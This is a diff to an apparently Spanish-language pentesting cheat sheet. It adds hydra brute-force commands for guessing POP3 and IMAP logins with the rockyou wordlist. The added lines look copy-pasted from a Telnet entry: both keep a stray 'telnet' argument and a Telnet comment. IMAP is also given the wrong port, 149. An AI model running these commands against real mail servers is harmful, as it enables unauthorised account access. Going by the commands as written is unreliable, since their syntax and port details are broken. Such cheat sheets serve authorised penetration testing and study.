@@ -132,6 +132,18 @@ EOF
 # -t 4 → Telnet es sensible a demasiados hilos
 ```
 
+### PoP3 (Puerto 110)
+```bash
+❯ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt pop3://<IP> telnet -t 4 -v 
+# -t 4 → Telnet es sensible a demasiados hilos
+```
+
+### Imap (Puerto 149)
+```bash
+❯ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt imap://<IP> telnet -t 4 -v 
+# -t 4 → Telnet es sensible a demasiados hilos
+```
+
 ### SMB (Puerto 445)
 ```bash
 ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>
